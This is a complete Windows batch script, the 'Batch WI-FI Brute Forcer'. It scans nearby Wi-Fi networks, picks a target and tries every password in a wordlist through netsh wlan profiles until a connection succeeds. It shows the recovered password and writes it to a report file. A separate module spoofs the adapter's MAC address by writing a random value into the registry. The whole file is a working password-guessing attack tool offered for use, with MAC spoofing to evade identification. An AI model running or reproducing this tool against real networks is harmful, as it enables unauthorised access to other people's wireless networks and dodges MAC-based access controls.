@echo off
        if not exist BF_Files\ (
	echo The BF_Files folder could not be found.
	echo Without it, the program cannot run.
	echo It may have been renamed, moved or deleted.
	echo To fix this issue, name the folder back, move it back or reinstall the program from GitHub.
	pause
	exit
	)
	
	set allowed_char_list="ABCDEFGHIJKLMNOPRSTUVYZWXQabcdefghijklmnoprstuvyzwxq0123456789-_"
	title The WI-FI Brute Forcer - Developed By TUX
	set /a attempt=1
	cls
	set targetwifi=No WI-FI Selected
	set interface_admin_state=Not Selected
	set interface_registry_location=Not Selected
	set interface_description=Not Selected
	set interface_id=Not Selected
	set interface_mac=Not Selected
	set interface_state=notdefined
	setlocal enabledelayedexpansion
	mode con: cols=130 lines=45
	color 0f
	set program_path=%0
	set program_directory=!program_path:~1,-17!
	set program_drive=!program_directory:~0,2!
	%program_drive%
	cd %program_directory%
	
	:check_Permissions
	net session >nul 2>&1
	if %errorLevel% == 0 (
		set privilege_level=administrator
		cd !current_directory!
		cd BF_Files
		del attempt.xml >nul
		del infogate.xml >nul
		cls

	)else (
		set privilege_level=local
		cd BF_Files
		del attempt.xml >nul
		del infogate.xml >nul
		cls
	)
	
	
	
	
	
	
	
	
	call :interface_detection
	
	
	if !interface_number!==1 (
	echo.
	call colorchar.exe /0b " Interface Detection"
	echo.
	echo.
	call colorchar.exe /0e " Only '1' Interface Found!"
	echo.
	echo.
	call colorchar.exe /0f " !interface_1_description!("
	call colorchar.exe /09 "!interface_1_mac!"
	call colorchar.exe /0f ")"
	echo.
	echo.
	echo  Making !interface_1_description! as default Interface...
	set interface_id=!interface_1_id!
	set interface_description=!interface_1_description!
	set interface_mac=!interface_1_mac!
	timeout /t 3 >nul
	)
	
	if !interface_number! gtr 1 (
	echo.
	call colorchar.exe /0b " Interface Detection"
	echo.
	echo.
	call colorchar.exe /0e " Multiple '!interface_number!' Interfaces Found!"
	echo.
	timeout /t 3 >nul
	call :interface_selection
	
	)
	
	if !interface_number!==0 (
	echo.
	call colorchar.exe /0b " Interface Detection"	
	echo.
	echo.
	call colorchar.exe /0e " WARNING"
	echo.
	echo  No interfaces found on this device^^!
	echo.
	echo  Press any key to continue...
	timeout /t 5 >nul
	cls
	)
	
	
	
	goto :main
	
	
	
	
	:main
	set mainmenuchoice=
	cls
	echo.
	echo  [------------------------------------------------------------------------------------------------------]
	echo.
	echo                     \_                              _/
	echo                       \       _______              /
	echo                             _/       \______
	echo              \_          __^|_________^|^|     ^|            _/
	echo                \        /             \_    /_____      /         (                             )
	echo                        /                \_ /      /              .                               .
	echo                       /                   \_     /____          .                                 .
	echo                     _/       __             \   /      \       .       (                   )       .
	echo                    ^|           \____        / /        \      .      .                     .      .
	echo                    ^|        ^\_      \______/__\       _^|     (      .      (    O    )      .      )
	echo                     ^|                           ^\____/ ^|      ^.      .          ^|          ^.      .
	echo                     ^|_                   /             /      .       (         ^|         )       .
	echo                       \           /     /             /        .              // \\              .
	echo                        \          ^|     ^|            /          .            //   \\            .
	echo                         \         \     ^|           /            (          //_____\\          )
	echo                          \_        \   /           /                       //       \\
	echo                            ^|                      /                       //_________\\
	echo                            ^|__                ___/                       //           \\
	echo                           /                    ^|                        //_____________\\
	echo                          /                     ^|                       //               \\
	echo                         /                      /
	echo                        /                      /
	echo  [------------------------------------------------------------------------------------------------------]
	call colorchar.exe /0b "                              THE BATCH WI-FI BRUTE FORCER (Version 1.2.0)"
	echo.
	call colorchar.exe /0e "                                           Developed By TUX"
	echo.
	echo  [------------------------------------------------------------------------------------------------------]
	echo.
	
	
	
	call colorchar.exe /0b "   Target - " 
	echo !targetwifi!
	call colorchar.exe /0b "   Interface - "
	echo !interface_description!
	echo.
	echo    Type "help" for more info
	
	call colorbox.exe /0F 1 29 104 35
	echo.
	echo.
	call :userinput
	set /p mainmenuchoice=
	
	if !mainmenuchoice!==exit (
	exit
	)
	

	if !mainmenuchoice!==test (
	cls
	echo.
	echo  ID !interface_id!
	echo  MAC !interface_mac!
	echo  DESC !interface_description!
	echo.
	pause
	cls
	goto :main
	)
	
	
	
	if !mainmenuchoice!==help (
		cls
		echo.
		call colorchar.exe /0b " Help Page"
		echo.
		echo.
		echo  - help             : Prints this page
		echo  - wifiscan         : Performs a WI-FI scan
		echo  - interface        : Open Interface Management
		echo  - attack           : Attacks on selected WI-FI
		echo.
		echo  For more informaton, please read "README.md".
		echo.
		echo.
		echo  Other projects of TUX:
		echo  "https://www.technicaluserx.wordpress.com"
		echo.
		echo  This project's UI has maden possible with TheBATeam group plugins.
		echo  TheBATeam project is ended, website is closed
		echo  New address is "https://www.batch-man.com/"
		echo.
		echo  Press any key to continue...
		pause >nul
		cls
		goto :main
	)
	
	
	if !mainmenuchoice!==interface (
		cls
		call :interface_management
		cls
		goto :main
	)
	
	
	
	
	
	if !mainmenuchoice!==wifiscan (
		del infogate.xml
		call :wifiscan
		call :exporter !targetwifi!
		goto :main
	)
	

	
	
	
	
	if !mainmenuchoice!==attack (
	set /a attempt=1
	
		if "!targetwifi!"=="No WI-FI Selected" (
			call colorchar.exe /0c " Please select a WI-FI..."
			echo.
			echo.
			echo  Press any key to continue...
			timeout /t 5 >nul
			cls
			set mainmenuchoice=
			goto :main
		)
		
		if "!interface_description!"=="Not Selected" (
			call colorchar.exe /0c " Please select an interface..."
			echo.
			echo.
			echo  Press any key to continue...
			timeout /t 5 >nul
			cls
			set mainmenuchoice=
			goto :main
		)		
		
		
		
		cls
		echo.
		call colorchar.exe /0e " WARNING"
		echo.
		echo  If you connected a network with this same name "!targetwifi!",
		echo  its profile will be deleted.
		echo.
		echo.
		echo  This app might not find the correct password if the signal strength
		echo  is too low!
		echo.
		echo  A good USB WI-FI antenna is recommended.
		echo.
		echo  Press any key to continue...
		pause >nul
		netsh wlan delete profile !targetwifi! interface="!interface_id!"
		cls
		echo.
		call colorchar.exe /0b " Processing passlist..."
		echo.
		set /a password_number=0
		for /f "tokens=1" %%a in ( passlist.txt ) do (
			set /a password_number=!password_number!+1
		)
		cls
		
		
		
		
	
	
	for /f "tokens=1" %%a in ( passlist.txt ) do (
		set temppass=%%a
		set temp_auth_num=0
		call :finalfunction !temppass!
		netsh wlan add profile filename=attempt.xml >nul
		call :calc_percentage "!attempt!" "!password_number!"
		cls
		echo  [==================================================]
		call colorchar.exe /07 "  Target WI-FI: "
		echo !targetwifi!
		call colorchar.exe /07 "  Total Passwords: "
		call colorchar.exe /0f "!password_number!"
		echo.
		call colorchar.exe /07 "  Percentage: "
		echo  %% !pass_percentage!	
		echo  [==================================================]
		call colorchar.exe /0b "  Trying the password -" 
		echo  !temppass!
		echo  [==================================================]
		call colorchar.exe /0e "  Attempt -"
		echo  !attempt!
		echo  [==================================================]
		echo   Current State:
		netsh wlan connect name=!targetwifi! interface="!interface_id!" >nul

	
		
	
		
		for /l %%a in ( 1, 1, 20) do (
			call :find_connection_state
				if !interface_state!==connecting (
				del infogate.xml
				del attempt.xml
				goto :show_result
			)
				if !interface_state!==connected (
				del infogate.xml
				del attempt.xml
				goto :show_result
			)
		
		)
		
		
	

	
	
	
	
	
	
	
	
		
		set /a attempt=!attempt!+1
		del attempt.xml
	)
	
	
		:Not_Found
		cls
		echo.
		echo  [==================================================]
		call colorchar.exe /0c "  Password not found. :'("
		echo.
		echo  [==================================================]
		echo.
		echo  Press any key to continue...
		pause >nul
		cls
	
	goto :main
	)


	call colorchar.exe /0c " Invalid input"
	timeout /t 2 >nul
	goto :main
	
	
	
	
	
	
	
	
	
	
	:wifiscan
	set /a keynumber=
	set choice=
	cls
	
		if "!interface_id!"=="Not Selected" (
		echo.
		call colorchar.exe /0c " You have to select an interface to perform a scan..."
		echo.
		echo.
		echo  Press any key to continue...
		timeout /t 5 >nul
		cls
		goto :main
		
		)
	
	
		if !interface_number!==0 (
		echo.
		call colorchar.exe /0c " You have at least '1' WI-FI interface to perform a scan..."
		echo.
		echo.
		echo  Press any key to continue...
		timeout /t 5 >nul
		cls
		goto :main
		
		)
	
	
		:test_connection
		set interface_state_check=false
	
			for /f "tokens=1-5" %%a in ('netsh wlan show interfaces ^| findstr /L "Name State"') do ( 
			
			if !interface_state_check!==true (
				set interface_state=%%c
				goto :skip_test_connection
			)
			
			if "!interface_id!"=="%%c" (
				set interface_state_check=true
			)
			
			if "!interface_id!"=="%%c %%d" (
				set interface_state_check=true
			)
		)
	
		:skip_test_connection
		if !interface_state!==connected (
			echo.
			echo  Disconnecting from current network...
			netsh wlan disconnect interface="!interface_id!" >nul
			timeout /t 3 >nul
		
		)


	

		
		:skip_disconnection
		cls
		
		del wifilist.txt
		cls
		set /a keynumber=0
		echo.
		call colorchar.exe /0b " Possible WIFI Networks"
		echo.
		echo.
		call colorchar.exe /0f " Using "
		call colorchar.exe /0e "!interface_description!"
		call colorchar.exe /0f " for scanning..."
		echo.
		echo  Low Signal Strength WI-FIs are not recommended
		echo.
		for /f "tokens=1-4" %%a in ('netsh wlan show networks mode^=bssid interface^="!interface_id!" ') do (

		
			if %%a==SSID (
				set /a keynumber=!keynumber! + 1
				set current_ssid=%%d

				call :character_finder_2 "!current_ssid!"

			)

			if %%a==Signal (
			set current_signal==%%c
			
			
				if !text_available!==true (
					call colorchar.exe /08 " !keynumber! - "
					call colorchar.exe /0f "!current_ssid!"
					call colorchar.exe /03 " - !current_signal:~1,5!"
					echo.
					
					echo !keynumber! - !current_ssid! - !current_signal:~1,4!>>wifilist.txt
					if !keynumber!==24 (
						goto :skip_scan
					)

				)else (
				call colorchar.exe /0e " !keynumber! - "
				call colorchar.exe /0c "Unsupported Char"
				echo.
				echo !keynumber! - Unsupported Char>>wifilist.txt
					if !keynumber!==24 (
						goto :skip_scan
					)
				
				)

			
			)




		)
		:skip_scan
		set /a keynumber=!keynumber!+1
		set choice_cancel=!keynumber!
		call colorchar.exe /08 " !keynumber! - "
		call colorchar.exe /07 "Cancel Selection"
		
		
		echo.
		echo.
		call colorchar.exe /0b " Please choice a wifi or cancel(1-!keynumber!)"
		echo.
		set choice=
		call colorchar.exe /0e " wifi"
		call colorchar.exe /0f "@"
		call colorchar.exe /08 "select"
		call colorchar.exe /0f "[]-"
		set /p choice=
	
	
	

		
		if !choice!==!choice_cancel! (
		set choice=
		set choice_cancel=
		cls
		goto :main
		)
	


		if !choice! gtr !keynumber! ( 
			call colorchar.exe /0c " Invalid input"
			echo.
			timeout /t 2 >nul
			cls
			set choice=
			goto :skip_disconnection
		)
		
		if !choice! lss 1 ( 
			call colorchar.exe /0c " Invalid input"
			echo.
			timeout /t 2 >nul
			cls
			set choice=
			goto :skip_disconnection
		)
		
		for /f "tokens=1-5" %%a in ( wifilist.txt ) do (
		
		if %%a==!choice! (
				set temp_signal_strength=%%e
				set signal_strength=!temp_signal_strength:~0,-1!
				if %%c==Unsupported (
					call colorchar.exe /0c " This SSID is unsupported..."
					timeout /t 3 >nul
					cls
					goto :skip_disconnection
				)else (
					
					if !signal_strength! lss 50 (
						echo.
						call colorchar.exe /0c " Low signal[!signal_strength!] strengths are not recommended."
						echo.
						echo  Do you want to continue anyway?[Y-N]
						set choice=
						call colorchar.exe /0e " continue"
						call colorchar.exe /0f "@"
						call colorchar.exe /08 "select"
						call colorchar.exe /0f "[]-"
						set /p choice=
							if !choice!==N (
								cls
								goto :skip_disconnection
							)
							if !choice!==Y (
								set targetwifi=%%c
								goto :skip_target_wifi
							)
							call colorchar.exe /0c " Invalid input"
							echo.
							timeout /t 2 >nul
							cls
							set choice=
							goto :skip_disconnection			
							
					)
					
				
					
					set targetwifi=%%c
					:skip_target_wifi
					echo Test >nul
					
				)
					
				
			)
		
		
		)
		
		del wifilist.txt
		cls
		goto :eof
	
	
	
	
	
	
	:finalfunction
		for /f "tokens=*" %%x in ( infogate.xml ) do (
		set code=%%x
		echo !code:changethiskey=%1!>>attempt.xml
		)
	goto :eof
	
	
	
	
	
	:exporter
		for /f "tokens=*" %%a in ( importwifi.xml ) do (
		set variable=%%a
		echo !variable:changethistitle=%1!>>infogate.xml
	)
	goto :eof
	
	
	
	
	
	
	
	
	:userinput
	call colorchar.exe /0a " !privilege_level!"
	call colorchar.exe /0f "@"
	call colorchar.exe /08 "user"
	call colorchar.exe /0f "[]-"
	goto :eof
	
	
	
	
	
	
	
	:character_finder_2
		set text_available=true
		call :create_string check_name "%~1"
		set /a check_name_length=!check_name_length!-1	
		for /l %%a in ( 0,1,!check_name_length!) do (
			set current_character=!check_name:~%%a,1!

			call :character_finder "!allowed_char_list!" "!current_character!"	
			if !character_found!==false (	
				set text_available=false
				goto :eof
			)
			
		)
	goto :eof
	
	
	
	
	
	
	
	:character_finder
	set character_found=false
	call :create_string string_find "%~1"
	set /a string_find_length=!string_find_length! - 1
	for /l %%a in ( 0, 1, !string_find_length! ) do (
		set character=!string_find:~%%a,1!
		if "!character!"=="%~2" (
		set character_found=true
		goto :eof
		)
	)
	goto :eof
	
	
	
	
	
	
	
	:create_string
		set /a takeaway=4
		set string=%~2
		echo %string%>var.txt
		
	for /f "useback tokens=*" %%a in ( '%string%' ) do (
		if %string%==%%~a (
			set /a takeaway=2
		)
		set string=%%~a 
	)
		set %~1=%string%
		for %%I in ( var.txt ) do (
			set /a %~1_length=%%~zI - %takeaway%
		)
		del var.txt
	goto :eof
	
	
	
	
	
	

	
	
	
	
	
	
	
	
	
	
	
	:interface_detection
	set interface_number=0
		
		for /f "tokens=1-4" %%a in ('netsh wlan show interfaces ^| findstr /L "Name Description Physical"') do (
			if "%%c"=="Wi-Fi" (
			
				if "%%d"=="" (
				set /a interface_number=!interface_number!+1
				set interface_!interface_number!_id=%%c
				)else (
				set /a interface_number=!interface_number!+1
				set interface_!interface_number!_id=%%c %%d
				)
			

			)
			if %%a==Description (
				set interface_!interface_number!_description=%%c %%d
			)
			if %%a==Physical (
				set interface_!interface_number!_mac=%%d
			)	
		)
	goto :eof

	
	
	
	
	
	
	
	
	
	
	
	

	:interface_selection
	set interface_choice=
	del interfacelist.txt >nul
	cls
	echo.
	set temp_interface_num_for_selection=1
	call colorchar.exe /0b " Interface Selection"
	echo.
	echo.
	for /l %%a in ( 1, 1, !interface_number! ) do (
		
		call colorchar.exe /08 " !temp_interface_num_for_selection! - "
		call colorchar.exe /0f "!interface_%%a_description!("
		call colorchar.exe /08 "!interface_%%a_mac!"
		call colorchar.exe /0f ")"
		echo.
		
		echo !temp_interface_num_for_selection! - !interface_%%a_description! - !interface_%%a_mac!>>interfacelist.txt
		
		set /a temp_interface_num_for_selection=!temp_interface_num_for_selection!+1
	)
		call colorchar.exe /08 " !temp_interface_num_for_selection! - "
		call colorchar.exe /07 "Cancel Selection"
		echo.
		echo !temp_interface_num_for_selection! - Cancel Selection>>interfacelist.txt
		set choice_cancel=!temp_interface_num_for_selection!
	
	
	
	echo.
	call colorchar.exe /0e " interface"
	call colorchar.exe /0f "@"
	call colorchar.exe /08 "select"
	call colorchar.exe /0f "[]-"
	set /p interface_choice=
	
		if !interface_choice!==!choice_cancel! (
			goto :eof
		)
	
		if !interface_choice! gtr !interface_number! ( 
			call colorchar.exe /0c " Invalid input"
			echo.
			timeout /t 2 >nul
			cls
			set interface_choice=
			goto :interface_selection
		)
	
		if !interface_choice! lss 1 ( 
			call colorchar.exe /0c " Invalid input"
			echo.
			timeout /t 2 >nul
			cls
			set interface_choice=
			goto :interface_selection
		)
	
	
	for /f "tokens=1-3" %%a in ( interfacelist.txt ) do (
	
		if !interface_choice!==%%a (
		echo.
		echo.
		
		
		
		
		
		set interface_id=!interface_%%a_id!
		set interface_description=!interface_%%a_description!
		set interface_mac=!interface_%%a_mac!
		set targetwifi=No WI-FI Selected
		
		
		call colorchar.exe /0f " Setting "
		call colorchar.exe /0e "!interface_description!"
		call colorchar.exe /f " as current interface..."
		timeout /t 3 >nul
		
		)
	
	)
	
	cls
	del interfacelist.txt
	goto :eof	
	
	
	
	
	
	:show_result
	del WIFI_Report.txt
			cls
			echo  [==================================================]
			call colorchar.exe /0b "  WI-FI Brute Force Results"
			echo.
			echo  [==================================================]
			call colorchar.exe /0f "  SSID: "
			call colorchar.exe /0e "!targetwifi!"
			echo.
			call colorchar.exe /0f "  Password: "
			call colorchar.exe /0a "!temppass!"
			echo.
			call colorchar.exe /0f "  Attempts: "
			call colorchar.exe /09 "!attempt!"
			echo.
			echo  [==================================================]
			echo.
			echo  Attack result has written to WIFI_Report.txt
			
			echo [------------------------------------]>>WIFI_Report.txt
			echo  WIFI Brute Force Results>>WIFI_Report.txt
			echo [------------------------------------]>>WIFI_Report.txt
			echo  SSID: !targetwifi!>>WIFI_Report.txt
			echo  Password: !temppass!>>WIFI_Report.txt
			echo  Attemps: !attempt!>>WIFI_Report.txt
			echo [------------------------------------]>>WIFI_Report.txt
			echo.
			echo  Press any key to exit...
			pause >nul
			exit
	goto :eof
	
	
	
	
	
	
	
	:find_connection_state
		set interface_state_check=false
	
			for /f "tokens=1-5" %%a in ('netsh wlan show interfaces ^| findstr /L "Name State"') do ( 
			
			if !interface_state_check!==true (
				set interface_state=%%c
				goto :skip_find_connection_state
			)
			
			if "!interface_id!"=="%%c" (
				set interface_state_check=true
			)
			
			if "!interface_id!"=="%%c %%d" (
				set interface_state_check=true
			)
		)
	:skip_find_connection_state
		if !interface_state!==associating (
		call colorchar.exe /0f " Associating..."
		echo.
		)
		if !interface_state!==disconnecting (
		call colorchar.exe /0c " Disconnecting..."
		echo.
		)
		if !interface_state!==disconnected (
		call colorchar.exe /04 " Disconnected."
		echo.
		)
		if !interface_state!==authenticating (
		call colorchar.exe /0a " Authenticating..."
		echo.
		)
		if !interface_state!==connecting (
		call colorchar.exe /02 " Connecting..."
		echo.
		)
		if !interface_state!==connected (
		call colorchar.exe /02 " CONNECTED."
		echo.
		timeout /t 2 /nobreak>nul
		)
			
	goto :eof
	
	
	
	
	
	
	
	:set_states
		set interface_%1_state=%2
	goto :eof
	
	
	
	
	:set_states_2
			if "!interface_number!"=="1" (
				set interface_state=!interface_1_state!
			)else (
				echo !interface_id!>interface_id.txt

					
					for /l %%a in ( 1, 1, 100) do (

			
						if "!interface_id!" equ "!interface_%%a_id!" (
							set interface_state=!interface_%%a_state!
						)
						
					)	
					
					
					
				del interface_id.txt
			)
	goto :eof
	
	:calc_percentage
	set /a pass_percentage = (%~1*100)/%~2
	
	goto :eof





	:mac_randomizer
	set allowed_mac_char_list_obliged=EA26
	set allowed_mac_char_list=123456789ABCDEF
	
	set set_mac=
	
	for /l %%a in ( 1,1,12) do (
	
		if %%a==2 (
			call :index_for_mac_calc_2
			call :set_mac_char_2 !index_for_mac!
		)else (	
			call :index_for_mac_calc_1
			call :set_mac_char_1 !index_for_mac!	
		)
	) 
	goto :eof
	:index_for_mac_calc_1
		set /a index_for_mac=(!random!) %% 15
	goto :eof
	:set_mac_char_1
		set set_mac=!set_mac!!allowed_mac_char_list:~%1,1!
	goto :eof
	:index_for_mac_calc_2
		set /a index_for_mac=(!random!) %% 4
	goto :eof
	:set_mac_char_2
		set set_mac=!set_mac!!allowed_mac_char_list_obliged:~%1,1!
	goto :eof





	:interface_mac_check 
		for /f "tokens=1-4" %%a in ( 'wmic nic get name^,macaddress ^| findstr /L "!interface_description!"') do (
			if "!interface_description!"=="%%b %%c" (
			set interface_mac=%%a
			goto :eof
			)
			
		)
	goto :eof




	:interface_admin_state_check
	for /f "tokens=1-5" %%a in ( ' netsh interface show interface name^="!interface_id!" ' ) do (
		if %%a==Administrative (
			set interface_admin_state=%%c
			goto :eof
		)
	)
	goto :eof






	:interface_registry_check

	for /f "tokens=* skip=7" %%a in ( 'REG QUERY HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}' ) do (
	
	
			set current_registry_key=%%a
			set current_registry_interface_description=
			set interface_mac_changed=false
			
			for /f "tokens=1-10" %%b in ( 'REG QUERY !current_registry_key!' ) do (
			

				if %%b==DriverDesc (
					set current_registry_interface_description=%%d %%e
			
				)
				
				if %%b==NetworkAddress (
					set interface_mac_changed=true
			
				)
				
			)	
				if "!interface_description!" equ "!current_registry_interface_description!" (
					set interface_registry_location=!current_registry_key!
					goto :eof
				)

	)
	goto :eof






















	:interface_management
	call :interface_admin_state_check
	call :interface_mac_check
	call :interface_registry_check
	:skip_interface_management_check
	cls
	echo.
	call colorchar.exe /0b "  Interface Management"
	echo.                                                             
	echo.
	echo.
	call colorchar.exe /0b "   Description: "
	call colorchar.exe /0e "!interface_description!
	echo.
	call colorchar.exe /0b "   Registry Location: "
	call colorchar.exe /0f "!interface_registry_location!"
	echo.
	call colorchar.exe /0b "   MAC Address: "
	call colorchar.exe /08 "!interface_mac!"
	echo.
	call colorchar.exe /0b "   MAC Address Status: "
	if "!interface_description!"=="Not Selected" (
		call colorchar.exe /0f "Not Selected"
		goto :skip_mac_address_status_show
	)
	if "!interface_mac_changed!"=="true" (
		call colorchar.exe /0c "Changed"
	)
	if !interface_mac_changed!==false (
		call colorchar.exe /0a "Original Static Address"
	)
	:skip_mac_address_status_show
	echo.
	call colorchar.exe /0b "   ID: "
	call colorchar.exe /0f "!interface_id!"
	echo.
	call colorchar.exe /0b "   Interface Status: "
	if "!interface_description!"=="Not Selected" (
		call colorchar.exe /0f "Not Selected"
	)
	if !interface_admin_state!==Enabled (
		call colorchar.exe /0a "Enabled"
	)
	if !interface_admin_state!==Disabled (
		call colorchar.exe /0c "Disabled"
	)
	echo.
	echo.
	echo.
	echo  [--------------------------------------------------------------------------------------------------------------------------]
	call colorchar.exe /0b "    Interafe Management Commands"
	echo.
	echo.  
	echo    - select interface              : Choose another interface
	echo    - macspoof                      : Perform MAC Spoofing (Administrator Privileges)
	echo    - exit                          : Exits Interface Management
	echo.
	echo  [--------------------------------------------------------------------------------------------------------------------------]
	echo.
	call colorbox.exe /0f 1 3 125 10
	
	
	call :userinput
	set /p interfacemanagementchoice=
	
	if !interfacemanagementchoice!==exit (
	set interfacemanagementchoice=
	cls
	goto :main
	)
	
	if "!interfacemanagementchoice!"=="select interface" (
	call :interface_detection
	call :interface_selection
	cls
	set interfacemanagementchoice=
	goto :interface_management
	
	)
	
	
	if "!interfacemanagementchoice!"=="macspoof" (
		if "!interface_description!"=="Not Selected" (
			echo.
			call colorchar.exe /0c " An Interface must be selected for MAC Spoofing..."
			timeout /t 3 >nul
			set interfacemanagementchoice=
			cls
			goto :skip_interface_management_check
		
		)
		
		
		call :mac_spoofing
		set interfacemanagementchoice=
		cls
		goto :skip_interface_management_check
	
	)
	
	
	call colorchar.exe /0c " Invalid input"
	echo.
	timeout /t 2 >nul
	cls
	set interfacemanagementchoice=
	goto :skip_interface_management_check










	:mac_spoofing
	
	if "!privilege_level!"=="local" (
		echo.
		call colorchar.exe /0c " Administrator Privileges required to use this feature..."
		timeout /t 3 >nul
		cls
		set interfacemanagementchoice=
		goto :skip_interface_management_check
	)
	cls
	echo.
	call colorchar.exe /0b " MAC Spoofing"
	echo.
	echo.
	echo  [--------------------------------------------------------------------------------------------------------------------------]
	call colorchar.exe /0b "   Interface: "
	call colorchar.exe /0e "!interface_description!"
	echo.
	call colorchar.exe /0b "   MAC: "
	call colorchar.exe /08 "!interface_mac!"
	echo.
	echo.
	echo  [--------------------------------------------------------------------------------------------------------------------------]
	call colorchar.exe /0b "    MAC Spoofing Commands"
	echo.
	echo.
	echo    - revert            : Revert MAC address to original
	echo    - randomize mac     : Randomize MAC Address
	echo    - exit              : Exit MAC Spoofing screen
	echo.
	echo  [--------------------------------------------------------------------------------------------------------------------------]
	echo.
	call colorbox.exe /0f 1 3 125 6
	
	call :userinput
	set /p macspoofingchoice=
	
	
	
	if "!macspoofingchoice!"=="exit" (
		set macspoofingchoice=
		cls
		goto :skip_interface_management_check
	
	)
	
	
	
	if "!macspoofingchoice!"=="revert" (
		
		if !interface_mac_changed!==false (
		echo.
		call colorchar.exe /0c " !interface_description! is already has Original Static MAC..."
		timeout /t 3 >nul
		set macspoofingchoice=
		cls
		goto :mac_spoofing
		)
		echo.
		echo  Disabling "!interface_description!"...
		netsh interface set interface name="!interface_id!" admin=disabled >nul
		echo  Reverting MAC Address...
		reg delete !interface_registry_location! /v NetworkAddress /f >nul
		echo  Enabling "!interface_description!"...
		netsh interface set interface name="!interface_id!" admin=enabled >nul
		call colorchar.exe /0a " Completed."
		timeout /t 3 >nul
		set macspoofingchoice=
		cls
		goto :interface_management
	
	
	
	)
	
	
	
	
	
	
	if "!macspoofingchoice!"=="randomize mac" (
		echo.
		echo  Generating a random MAC Address...
		call :mac_randomizer
		echo.
		call colorchar.exe /0f " Generated: "
		call colorchar.exe /0a "!set_mac!"
		echo.
		echo  Disabling "!interface_description!"...
		netsh interface set interface name="!interface_id!" admin=disabled >nul	
		echo  Applying new MAC Address...
		reg add !interface_registry_location! /v NetworkAddress /t REG_SZ /d "!set_mac!"
		echo  Enabling "!interface_description!"...
		netsh interface set interface name="!interface_id!" admin=enabled >nul
		call colorchar.exe /0a " Completed."
		timeout /t 3 >nul
		set macspoofingchoice=
		cls
		goto :interface_management
	)
	

	
	echo.
	call colorchar.exe /0c " Invalid input"
	echo.
	timeout /t 2 >nul
	set macspoofingchoice=
	cls
	goto :mac_spoofing

























	
	
